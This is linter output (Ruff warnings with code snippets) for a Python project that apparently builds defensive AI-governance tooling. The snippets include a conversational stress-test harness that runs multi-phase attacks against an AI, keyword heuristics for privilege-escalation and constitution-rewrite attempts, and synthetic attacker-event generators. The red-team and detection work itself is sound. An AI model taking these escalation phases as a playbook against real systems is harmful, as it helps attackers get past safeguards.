SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\conversational_stress_orchestrator.py:473:17
    |
472 |                   # Checkpoint periodically
473 | /                 if turn_num % self.config.checkpoint_interval == 0:
474 | |                     if self.config.enable_progress_tracking:
    | |____________________________________________________________^
475 |                           self._save_checkpoint()
    |
help: Combine `if` statements using `and`

UP041 [*] Replace aliased errors with `TimeoutError`
   --> src\app\testing\conversational_stress_orchestrator.py:477:20
    |
475 |                         self._save_checkpoint()
476 |
477 |             except asyncio.TimeoutError:
    |                    ^^^^^^^^^^^^^^^^^^^^
478 |                 logger.warning(
479 |                     "Test %s phase %s turn %d timed out",
    |
help: Replace `asyncio.TimeoutError` with builtin `TimeoutError`

F841 Local variable `technique` is assigned to but never used
   --> src\app\testing\conversational_stress_orchestrator.py:551:9
    |
549 |         # attack generation based on the test strategy and previous context.
550 |
551 |         technique = techniques[turn_num % len(techniques)] if techniques else "generic"
    |         ^^^^^^^^^
552 |         objective = objectives[turn_num % len(objectives)] if objectives else "probe"
    |
help: Remove assignment to unused variable `technique`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\conversational_stress_orchestrator.py:682:9
    |
681 |           # Check: All phases must complete
682 | /         if criteria.get("all_phases_must_complete", True):
683 | |             if len(phases_progress) < len(test.phases):
    | |_______________________________________________________^
684 |                   logger.debug("Test %s failed: Not all phases completed", test.test_id)
685 |                   return False
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\conversational_stress_orchestrator.py:690:13
    |
688 |           min_turns_per_phase = criteria.get("minimum_turns_per_phase", [])
689 |           for i, phase in enumerate(phases_progress):
690 | /             if i < len(min_turns_per_phase):
691 | |                 if phase.current_turn < min_turns_per_phase[i]:
    | |_______________________________________________________________^
692 |                       logger.debug(
693 |                           "Test %s failed: Phase %d incomplete (%d < %d turns)",
    |
help: Combine `if` statements using `and`

F401 `adversarial_tests.galahad_model.GalahadModel` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\testing\governance_integration.py:80:57
   |
78 |         try:
79 |             # Try to import Galahad
80 |             from adversarial_tests.galahad_model import GalahadModel
   |                                                         ^^^^^^^^^^^^
81 |
82 |             return True
   |
help: Remove unused import: `adversarial_tests.galahad_model.GalahadModel`

F401 `app.core.cerberus_hydra.CerberusHydra` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\testing\governance_integration.py:91:49
   |
89 |         try:
90 |             # Try to import Cerberus components
91 |             from app.core.cerberus_hydra import CerberusHydra
   |                                                 ^^^^^^^^^^^^^
92 |
93 |             return True
   |
help: Remove unused import: `app.core.cerberus_hydra.CerberusHydra`

F401 `app.agents.codex_deus_maximus.CodexDeusMaximus` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> src\app\testing\governance_integration.py:102:55
    |
100 |         try:
101 |             # Try to import Codex Deus
102 |             from app.agents.codex_deus_maximus import CodexDeusMaximus
    |                                                       ^^^^^^^^^^^^^^^^
103 |
104 |             return True
    |
help: Remove unused import: `app.agents.codex_deus_maximus.CodexDeusMaximus`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\governance_integration.py:251:13
    |
250 |               # Cerberus Head 1: Authentication & Authorization
251 | /             if "admin" in attack_message.lower() or "root" in attack_message.lower():
252 | |                 if "granted" in system_response.lower():
    | |________________________________________________________^
253 |                       violations.append(
254 |                           {
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\governance_integration.py:313:13
    |
312 |               # Check if constitutional principles are being challenged
313 | /             if any(
314 | |                 keyword in attack_message.lower() for keyword in constitutional_keywords
315 | |             ):
316 | |                 if (
317 | |                     "rewrite" in attack_message.lower()
318 | |                     or "amend" in attack_message.lower()
319 | |                 ):
    | |__________________^
320 |                       violations.append(
321 |                           {
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\testing\governance_integration.py:329:13
    |
328 |               # Codex Deus: Sovereign integrity check
329 | /             if phase == "sovereign_overthrow":
330 | |                 # In final phase, any compliance is a violation
331 | |                 if not any(
332 | |                     denial in system_response.lower()
333 | |                     for denial in ["cannot", "unable", "not permitted", "against my"]
334 | |                 ):
    | |__________________^
335 |                       violations.append(
336 |                           {
    |
help: Combine `if` statements using `and`

F401 [*] `json` imported but unused
  --> src\app\testing\run_anti_sovereign_tests.py:18:8
   |
16 | import argparse
17 | import asyncio
18 | import json
   |        ^^^^
19 | import logging
20 | import sys
   |
help: Remove unused import: `json`

E402 Module level import not at top of file
  --> src\app\testing\run_anti_sovereign_tests.py:28:1
   |
26 | sys.path.insert(0, str(project_root))
27 |
28 | from src.app.testing.anti_sovereign_stress_tests import AntiSovereignStressTestGenerator
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 | from src.app.testing.conversational_stress_orchestrator import (
30 |     ConversationalStressTestOrchestrator,
   |

E402 Module level import not at top of file
  --> src\app\testing\run_anti_sovereign_tests.py:29:1
   |
28 |   from src.app.testing.anti_sovereign_stress_tests import AntiSovereignStressTestGenerator
29 | / from src.app.testing.conversational_stress_orchestrator import (
30 | |     ConversationalStressTestOrchestrator,
31 | |     OrchestratorConfig,
32 | | )
   | |_^
33 |   from src.app.testing.stress_test_dashboard import (
34 |       ConversationalStressTestDashboard,
   |

E402 Module level import not at top of file
  --> src\app\testing\run_anti_sovereign_tests.py:33:1
   |
31 |       OrchestratorConfig,
32 |   )
33 | / from src.app.testing.stress_test_dashboard import (
34 | |     ConversationalStressTestDashboard,
35 | |     generate_html_dashboard,
36 | | )
   | |_^
37 |
38 |   # Configure logging
   |

F401 [*] `dataclasses.asdict` imported but unused
  --> src\app\testing\stress_test_dashboard.py:21:25
   |
19 | import os
20 | from collections import defaultdict
21 | from dataclasses import asdict, dataclass
   |                         ^^^^^^
22 | from datetime import UTC, datetime
23 | from pathlib import Path
   |
help: Remove unused import: `dataclasses.asdict`

F401 [*] `pathlib.Path` imported but unused
  --> src\app\testing\stress_test_dashboard.py:23:21
   |
21 | from dataclasses import asdict, dataclass
22 | from datetime import UTC, datetime
23 | from pathlib import Path
   |                     ^^^^
24 | from typing import Any
   |
help: Remove unused import: `pathlib.Path`

SIM113 Use `enumerate()` for index variable `cumulative_tests` in `for` loop
   --> src\app\testing\stress_test_dashboard.py:477:17
    |
476 |             for session in sessions:
477 |                 cumulative_tests += 1
    |                 ^^^^^^^^^^^^^^^^^^^^^
478 |                 cumulative_turns += session.get("total_turns", 0)
479 |                 cumulative_breaches += session.get("total_breaches", 0)
    |

W291 Trailing whitespace
 --> src\cerberus\sase\advanced\raft_consensus.py:2:43
  |
1 | """
2 | SASE - Sovereign Adversarial Signal Engine  
  |                                           ^^
3 | L14: Multi-Region Quorum & Raft Consensus
  |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> src\cerberus\sase\advanced\raft_consensus.py:9:30
   |
 7 | FEATURES:
 8 | - Leader election
 9 | - Append-only log replication  
   |                              ^^
10 | - Conflict resolution via term index
11 | """
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> src\cerberus\sase\advanced\threat_ontology.py:9:23
   |
 7 | CLASSES:
 8 | - Opportunistic Scanner
 9 | - Credential Harvester  
   |                       ^^
10 | - Cloud VPS Actor
11 | - Botnet Node
   |
help: Remove trailing whitespace

F821 Undefined name `Any`
   --> src\cerberus\sase\advanced\threat_ontology.py:165:40
    |
163 |         logger.info("L15 Threat Actor Classifier initialized")
164 |
165 |     def classify(self, feature_vector: Any) -> dict:
    |                                        ^^^
166 |         """
167 |         Classify threat actor
    |

F841 Local variable `leaf_idx` is assigned to but never used
  --> src\cerberus\sase\audit\evidence_vault.py:95:9
   |
94 |         # Find leaf index
95 |         leaf_idx = self.leaf_hashes.index(leaf_hash)
   |         ^^^^^^^^
96 |
97 |         # Generate proof path
   |
help: Remove assignment to unused variable `leaf_idx`

SIM101 Multiple `isinstance` calls for `value`, merge into a single call
  --> src\cerberus\sase\core\deterministic.py:46:18
   |
44 |                 # Bools must come before int check since bool is subclass of int
45 |                 normalized[key] = value
46 |             elif isinstance(value, int) or isinstance(value, str):
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |                 normalized[key] = value
48 |             elif isinstance(value, list):
   |
help: Merge `isinstance` calls for `value`

F841 Local variable `event_hash` is assigned to but never used
   --> src\cerberus\sase\core\ingestion_gateway.py:266:9
    |
265 |         # 8. Store immutably
266 |         event_hash = self.store.store(event)
    |         ^^^^^^^^^^
267 |
268 |         logger.info(f"Telemetry ingested: {event.event_id}")
    |
help: Remove assignment to unused variable `event_hash`

F401 [*] `os` imported but unused
  --> src\cerberus\sase\core\substrate.py:9:8
   |
 8 | import logging
 9 | import os
   |        ^^
10 | import shutil
11 | import time
   |
help: Remove unused import: `os`

N818 Exception name `InvariantViolation` should be named with an Error suffix
  --> src\cerberus\sase\governance\invariants.py:21:7
   |
21 | class InvariantViolation(Exception):
   |       ^^^^^^^^^^^^^^^^^^
22 |     """Raised when SASE invariant is violated"""
   |

SIM108 Use ternary operator `z_score = 0.0 if std < 1e-06 else abs(hour - mean_hour) / std` instead of `if`-`else`-block
   --> src\cerberus\sase\intelligence\attribution.py:212:9
    |
211 |           # Z-score
212 | /         if std < 1e-6:
213 | |             z_score = 0.0
214 | |         else:
215 | |             z_score = abs(hour - mean_hour) / std
    | |_________________________________________________^
216 |
217 |           # Convert to 0-1 range (3 sigma rule)
    |
help: Replace `if`-`else`-block with `z_score = 0.0 if std < 1e-06 else abs(hour - mean_hour) / std`

W291 Trailing whitespace
 --> src\cerberus\sase\intelligence\bayesian_scoring.py:8:27
  |
7 | FORMULA:
8 | P(M|E) = (P(E|M) * P(M)) / 
  |                           ^
9 |          [(P(E|M) * P(M)) + (P(E|┬¼M) * (1 - P(M)))]
  |
help: Remove trailing whitespace

SIM108 Use ternary operator `posterior = 0.5 if denominator < 1e-10 else numerator / denominator` instead of `if`-`else`-block
   --> src\cerberus\sase\intelligence\bayesian_scoring.py:233:9
    |
231 |           )
232 |
233 | /         if denominator < 1e-10:
234 | |             posterior = 0.5  # Undefined, default to neutral
235 | |         else:
236 | |             posterior = numerator / denominator
    | |_______________________________________________^
237 |
238 |           # Clamp to valid range
    |
help: Replace `if`-`else`-block with `posterior = 0.5 if denominator < 1e-10 else numerator / denominator`

F401 [*] `dataclasses.field` imported but unused
  --> src\cerberus\sase\policy\containment.py:23:36
   |
21 | import logging
22 | import time
23 | from dataclasses import dataclass, field
   |                                    ^^^^^
24 | from typing import Any
   |
help: Remove unused import: `dataclasses.field`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\cerberus\sase\policy\containment.py:208:9
    |
206 |           # Hash validation (if request carries a model hash field)
207 |           model_hash = getattr(request, "model_hash", None)
208 | /         if model_hash and entry.sha256_hash != "default":
209 | |             if model_hash != entry.sha256_hash:
    | |_______________________________________________^
210 |                   return (
211 |                       False,
    |
help: Combine `if` statements using `and`

F841 Local variable `containment_result` is assigned to but never used
   --> src\cerberus\sase\sase_orchestrator.py:215:21
    |
213 |                     )
214 |
215 |                     containment_result = self.containment_orchestrator.orchestrate(
    |                     ^^^^^^^^^^^^^^^^^^
216 |                         containment_req,
217 |                         feature_vector,
    |
help: Remove assignment to unused variable `containment_result`

W291 Trailing whitespace
  --> src\cerberus\sase\testing\adaptive_chaos.py:8:35
   |
 6 | BLIND SPOTS IN STATIC CHAOS:
 7 | - Low-and-slow attacks
 8 | - Mixed benign-malicious sequences  
   |                                   ^^
 9 | - Gradual escalation patterns
10 | - Infrastructure pivots (Tor ΓåÆ VPS)
   |
help: Remove trailing whitespace

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:105:13
    |
103 |         # Phase 1: Legitimate baseline (20 events)
104 |         base_ip = self._random_ip()
105 |         for i in range(20):
    |             ^
106 |             events.append(
107 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:121:13
    |
120 |         # Phase 2: Elevated rate (10 events, same IP)
121 |         for i in range(10):
    |             ^
122 |             events.append(
123 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:137:13
    |
136 |         # Phase 3: Token anomalies (5 events)
137 |         for i in range(5):
    |             ^
138 |             events.append(
139 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:153:13
    |
152 |         # Phase 4: Clear token reuse (3 events)
153 |         for i in range(3):
    |             ^
154 |             events.append(
155 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:190:13
    |
189 |         # Phase 1: Tor exit nodes (3 different exits)
190 |         for i in range(3):
    |             ^
191 |             events.append(
192 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:207:13
    |
205 |         # Phase 2: Pivot to AWS VPS
206 |         vps_ip = self._random_ip()
207 |         for i in range(3):
    |             ^
208 |             events.append(
209 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:224:13
    |
222 |         # Phase 3: Pivot to residential proxy (botnet)
223 |         residential_ip = self._random_ip()
224 |         for i in range(3):
    |             ^
225 |             events.append(
226 |                 SyntheticEvent(
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `cycle` not used within loop body
   --> src\cerberus\sase\testing\adaptive_chaos.py:262:13
    |
260 |         attack_ip = self._random_ip()
261 |
262 |         for cycle in range(5):
    |             ^^^^^
263 |             # Attack
264 |             events.append(
    |
help: Rename unused `cycle` to `_cycle`

UP042 Class GenesisStatus inherits from both `str` and `enum.Enum`
  --> src\psia\bootstrap\genesis.py:41:7
   |
41 | class GenesisStatus(str, Enum):
   |       ^^^^^^^^^^^^^
42 |     """Status of the genesis ceremony."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\bootstrap\genesis.py:197:28
    |
196 |         self._status = GenesisStatus.IN_PROGRESS
197 |         now = datetime.now(timezone.utc).isoformat()
    |                            ^^^^^^^^^^^^
198 |
199 |         try:
    |
help: Convert to `datetime.UTC` alias

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\bootstrap\readiness.py:34:1
   |
32 | from datetime import datetime, timezone
33 | from enum import Enum
34 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
35 |
36 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP042 Class NodeStatus inherits from both `str` and `enum.Enum`
  --> src\psia\bootstrap\readiness.py:39:7
   |
39 | class NodeStatus(str, Enum):
   |       ^^^^^^^^^^
40 |     """Lifecycle status of a PSIA node."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\bootstrap\readiness.py:68:46
   |
66 |     checks: list[CheckResult] = field(default_factory=list)
67 |     timestamp: str = field(
68 |         default_factory=lambda: datetime.now(timezone.utc).isoformat()
   |                                              ^^^^^^^^^^^^
69 |     )
70 |     all_passed: bool = False
   |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\bootstrap\safe_halt.py:33:36
   |
32 | import logging
33 | from dataclasses import dataclass, field
   |                                    ^^^^^
34 | from datetime import datetime, timezone
35 | from enum import Enum
   |
help: Remove unused import: `dataclasses.field`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\bootstrap\safe_halt.py:36:1
   |
34 | from datetime import datetime, timezone
35 | from enum import Enum
36 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
37 |
38 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

F401 [*] `typing.Any` imported but unused
  --> src\psia\bootstrap\safe_halt.py:36:20
   |
34 | from datetime import datetime, timezone
35 | from enum import Enum
36 | from typing import Any, Callable
   |                    ^^^
37 |
38 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.Any`

UP042 Class HaltReason inherits from both `str` and `enum.Enum`
  --> src\psia\bootstrap\safe_halt.py:41:7
   |
41 | class HaltReason(str, Enum):
   |       ^^^^^^^^^^
42 |     """Reason for entering SAFE-HALT mode."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\bootstrap\safe_halt.py:113:28
    |
111 |             HaltEvent record
112 |         """
113 |         now = datetime.now(timezone.utc).isoformat()
    |                            ^^^^^^^^^^^^
114 |
115 |         event = HaltEvent(
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\capability_authority.py:148:28
    |
147 |         ttl = ttl_hours or self.default_ttl_hours
148 |         now = datetime.now(timezone.utc)
    |                            ^^^^^^^^^^^^
149 |         tid = token_id or f"cap_{uuid.uuid4().hex[:12]}"
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\capability_authority.py:215:28
    |
213 |             return True  # Already revoked
214 |
215 |         now = datetime.now(timezone.utc).isoformat()
    |                            ^^^^^^^^^^^^
216 |         self._revocation_list[token_id] = RevocationEntry(
217 |             token_id=token_id,
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\capability_authority.py:274:40
    |
272 |                 token_id=old_token_id,
273 |                 actor=self.authority_did,
274 |                 timestamp=datetime.now(timezone.utc).isoformat(),
    |                                        ^^^^^^^^^^^^
275 |                 details={"new_token_id": new_token.token_id},
276 |             )
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\capability_authority.py:295:50
    |
293 |             expires = datetime.fromisoformat(token.expires_at)
294 |             if expires.tzinfo is None:
295 |                 expires = expires.replace(tzinfo=timezone.utc)
    |                                                  ^^^^^^^^^^^^
296 |             return expires > datetime.now(timezone.utc)
297 |         except (ValueError, TypeError):
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\capability_authority.py:296:43
    |
294 |             if expires.tzinfo is None:
295 |                 expires = expires.replace(tzinfo=timezone.utc)
296 |             return expires > datetime.now(timezone.utc)
    |                                           ^^^^^^^^^^^^
297 |         except (ValueError, TypeError):
298 |             return False
    |
help: Convert to `datetime.UTC` alias

UP042 Class CommitStatus inherits from both `str` and `enum.Enum`
  --> src\psia\canonical\commit_coordinator.py:37:7
   |
37 | class CommitStatus(str, Enum):
   |       ^^^^^^^^^^^^
38 |     """Status of a commit operation."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\commit_coordinator.py:165:37
    |
163 |             value=value,
164 |             version=new_version,
165 |             updated_at=datetime.now(timezone.utc).isoformat(),
    |                                     ^^^^^^^^^^^^
166 |             updated_by=actor,
167 |             commit_id=commit_id,
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\canonical\commit_coordinator.py:301:13
    |
299 |           for key in mutations:
300 |               version_before[key] = self.store.get_version(key)
301 | /             if expected_versions and key in expected_versions:
302 | |                 if version_before[key] != expected_versions[key]:
    | |_________________________________________________________________^
303 |                       return CommitResult(
304 |                           commit_id=commit_id,
    |
help: Combine `if` statements using `and`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\commit_coordinator.py:327:40
    |
325 |                 new_value=new_value,
326 |                 new_version=version_before[key] + 1,
327 |                 timestamp=datetime.now(timezone.utc).isoformat(),
    |                                        ^^^^^^^^^^^^
328 |             )
329 |             wal_entries.append(entry)
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\canonical\ledger.py:57:46
   |
55 |     stage_results: list[dict] = field(default_factory=list)
56 |     timestamp: str = field(
57 |         default_factory=lambda: datetime.now(timezone.utc).isoformat()
   |                                              ^^^^^^^^^^^^
58 |     )
59 |     metadata: dict[str, Any] = field(default_factory=dict)
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\ledger.py:186:34
    |
184 |             prev_hash = self.GENESIS_HASH
185 |
186 |         sealed_at = datetime.now(timezone.utc).isoformat()
    |                                  ^^^^^^^^^^^^
187 |
188 |         block = LedgerBlock(
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\canonical\ledger.py:293:43
    |
291 |             record_count=block.record_count,
292 |             anchor_hash=anchor_hash,
293 |             anchor_timestamp=datetime.now(timezone.utc).isoformat(),
    |                                           ^^^^^^^^^^^^
294 |         )
295 |         return True
    |
help: Convert to `datetime.UTC` alias

UP042 Class ConflictResolution inherits from both `str` and `enum.Enum`
  --> src\psia\concurrency.py:63:7
   |
63 | class ConflictResolution(str, Enum):
   |       ^^^^^^^^^^^^^^^^^^
64 |     """Strategy for resolving commit conflicts."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class CommitOutcome inherits from both `str` and `enum.Enum`
  --> src\psia\concurrency.py:71:7
   |
71 | class CommitOutcome(str, Enum):
   |       ^^^^^^^^^^^^^
72 |     """Result of a commit attempt."""
   |
help: Inherit from `enum.StrEnum`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\crypto\ed25519_provider.py:102:28
    |
100 |         private_key = Ed25519PrivateKey.generate()
101 |         public_key = private_key.public_key()
102 |         now = datetime.now(timezone.utc).isoformat()
    |                            ^^^^^^^^^^^^
103 |
104 |         if key_id is None:
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\crypto\ed25519_provider.py:261:41
    |
259 |     def __init__(self) -> None:
260 |         self._keys: dict[str, Ed25519KeyPair] = {}
261 |         self._created_at = datetime.now(timezone.utc).isoformat()
    |                                         ^^^^^^^^^^^^
262 |
263 |     def register(self, keypair: Ed25519KeyPair) -> None:
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\crypto\rfc3161_provider.py:248:33
    |
246 |             self._used_nonces.add(nonce)
247 |
248 |         gen_time = datetime.now(timezone.utc).isoformat()
    |                                 ^^^^^^^^^^^^
249 |
250 |         # Build the token (unsigned first, to compute signed content)
    |
help: Convert to `datetime.UTC` alias

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\psia\events.py:23:1
   |
21 | from dataclasses import dataclass, field
22 | from datetime import datetime, timezone
23 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP042 Class EventType inherits from both `str` and `enum.Enum`
  --> src\psia\events.py:28:7
   |
28 | class EventType(str, enum.Enum):
   |       ^^^^^^^^^
29 |     """Complete event taxonomy for PSIA observability."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class EventSeverity inherits from both `str` and `enum.Enum`
  --> src\psia\events.py:96:7
   |
96 | class EventSeverity(str, enum.Enum):
   |       ^^^^^^^^^^^^^
97 |     """Severity levels for PSIA events."""
   |
help: Inherit from `enum.StrEnum`

SIM108 Use ternary operator `events = self._history[-limit:] if limit is not None else list(self._history)` instead of `if`-`else`-block
   --> src\psia\events.py:245:9
    |
243 |               List of PSIAEvent instances in chronological order
244 |           """
245 | /         if limit is not None:
246 | |             events = self._history[-limit:]
247 | |         else:
248 | |             events = list(self._history)
    | |________________________________________^
249 |           self._history.clear()
250 |           return events
    |
help: Replace `if`-`else`-block with `events = self._history[-limit:] if limit is not None else list(self._history)`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\events.py:294:32
    |
292 |         subject=subject,
293 |         severity=severity,
294 |         timestamp=datetime.now(timezone.utc).isoformat(),
    |                                ^^^^^^^^^^^^
295 |         payload=payload or {},
296 |         artifact_hashes=artifact_hashes or {},
    |
help: Convert to `datetime.UTC` alias

F401 [*] `dataclasses.dataclass` imported but unused
  --> src\psia\gate\capability_head.py:26:25
   |
25 | import logging
26 | from dataclasses import dataclass, field
   |                         ^^^^^^^^^
27 | from datetime import datetime, timezone
28 | from typing import Any
   |
help: Remove unused import

F401 [*] `dataclasses.field` imported but unused
  --> src\psia\gate\capability_head.py:26:36
   |
25 | import logging
26 | from dataclasses import dataclass, field
   |                                    ^^^^^
27 | from datetime import datetime, timezone
28 | from typing import Any
   |
help: Remove unused import

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\capability_head.py:140:9
    |
139 |           # ΓöÇΓöÇ Check 3: Issuer-subject match ΓöÇΓöÇ
140 | /         if token.subject != envelope.actor:
141 | |             # Token was issued to a different subject
142 | |             if not token.delegation.is_delegable:
    | |_________________________________________________^
143 |                   reasons.append(
144 |                       DenyReason(
    |
help: Combine `if` statements using `and`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\capability_head.py:155:56
    |
153 |             expires_at = datetime.fromisoformat(token.expires_at)
154 |             if expires_at.tzinfo is None:
155 |                 expires_at = expires_at.replace(tzinfo=timezone.utc)
    |                                                        ^^^^^^^^^^^^
156 |             now = datetime.now(timezone.utc)
157 |             from datetime import timedelta
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\capability_head.py:156:32
    |
154 |             if expires_at.tzinfo is None:
155 |                 expires_at = expires_at.replace(tzinfo=timezone.utc)
156 |             now = datetime.now(timezone.utc)
    |                                ^^^^^^^^^^^^
157 |             from datetime import timedelta
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\capability_head.py:191:9
    |
189 |           # ΓöÇΓöÇ Check 6: Delegation chain depth ΓöÇΓöÇ
190 |           delegation_depth = getattr(envelope.context, "delegation_depth", 0) or 0
191 | /         if token.delegation.max_depth is not None:
192 | |             if delegation_depth > token.delegation.max_depth:
    | |_____________________________________________________________^
193 |                   reasons.append(
194 |                       DenyReason(
    |
help: Combine `if` statements using `and`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\capability_head.py:245:36
    |
243 |             reasons=reasons,
244 |             constraints_applied=constraints,
245 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
246 |             signature=Signature(
247 |                 alg="ed25519",
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> src\psia\gate\identity_head.py:92:48
   |
90 |                 "revocation": {
91 |                     "status": "revoked",
92 |                     "revoked_at": datetime.now(timezone.utc).isoformat(),
   |                                                ^^^^^^^^^^^^
93 |                     "reason": reason,
94 |                 }
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\identity_head.py:208:36
    |
206 |         # ΓöÇΓöÇ Check 4: Public key validity window ΓöÇΓöÇ
207 |         if doc is not None and not doc.revocation.is_revoked:
208 |             now_iso = datetime.now(timezone.utc).isoformat()
    |                                    ^^^^^^^^^^^^
209 |             has_valid_key = False
210 |             for key in doc.public_keys:
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\identity_head.py:241:9
    |
240 |           # ΓöÇΓöÇ Check 6: Subject-actor relationship ΓöÇΓöÇ
241 | /         if envelope.subject != envelope.actor:
242 | |             # Cross-identity request: requires delegation proof
243 | |             # For Phase 3, we accept if no doc store is configured (open mode)
244 | |             if self.doc_store.count > 0 and doc is not None:
    | |____________________________________________________________^
245 |                   subject_doc = self.doc_store.resolve(envelope.subject)
246 |                   if subject_doc is None:
    |
help: Combine `if` statements using `and`

F841 Local variable `has_critical` is assigned to but never used
   --> src\psia\gate\identity_head.py:277:13
    |
275 |             decision = "deny"
276 |         else:
277 |             has_critical = False
    |             ^^^^^^^^^^^^
278 |             decision = "allow"
    |
help: Remove assignment to unused variable `has_critical`

UP017 [*] Use `datetime.UTC` alias
   --> src\psia\gate\identity_head.py:286:36
    |
284 |             reasons=reasons,
285 |             constraints_applied=constraints,
286 |             timestamp=datetime.now(timezone.utc).isoformat(),
    |                                    ^^^^^^^^^^^^
287 |             signature=Signature(
288 |                 alg="ed25519",
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\invariant_head.py:118:9
    |
116 |           """
117 |           # Check 1: Does this invariant apply to this action?
118 | /         if inv.scope.value in ("immutable", "constitutional"):
119 | |             # Root/constitutional invariants apply to all mutations
120 | |             if action not in self._MUTATION_ACTIONS:
    | |____________________________________________________^
121 |                   return True, f"{inv.invariant_id}: not applicable (non-mutation action)"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\psia\gate\invariant_head.py:132:9
    |
130 |           # Check 3: Action-specific heuristic checks
131 |           # (These are simplified; a real solver would evaluate the formal expression)
132 | /         if inv.invariant_id == "inv_root_001":
133 | |             # INV-ROOT-1: No invariant can be disabled at runtime
134 | |             if action == "mutate_policy" and "invariant" in resource.lower():
    | |_____________________________________________________________________________^
135 |                   return False, (
136 |                       f"{inv.invariant_id}: attempt to mutate invariant-related "
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
